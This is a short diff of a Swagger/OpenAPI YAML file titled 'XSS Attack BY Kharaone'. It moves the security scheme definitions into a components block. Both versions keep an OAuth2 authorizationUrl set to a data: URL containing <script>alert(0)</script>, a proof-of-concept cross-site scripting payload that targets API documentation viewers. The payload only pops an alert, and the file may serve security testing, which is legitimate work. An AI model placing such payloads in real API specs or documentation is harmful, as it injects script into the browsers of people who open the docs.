@@ -1,16 +1,17 @@
 swagger: '2.0'
+components:
+  securitySchemes:
+    basicAuth:
+      type: basic
+    oAuthNoScopes:
+        type: oauth2
+        flows: 
+          implicit: 
+            authorizationUrl: data:text/html,<script>alert(0)</script>
+            scopes: {}
 security:
   - basicAuth: []
   - oAuthNoScopes: []
-securityDefinitions:
-  basicAuth:
-    type: basic
-  oAuthNoScopes:
-      type: oauth2
-      flows: 
-        implicit: 
-          authorizationUrl: data:text/html,<script>alert(0)</script>
-          scopes: {}
 info:
   title: XSS Attack BY Kharaone
   description: |
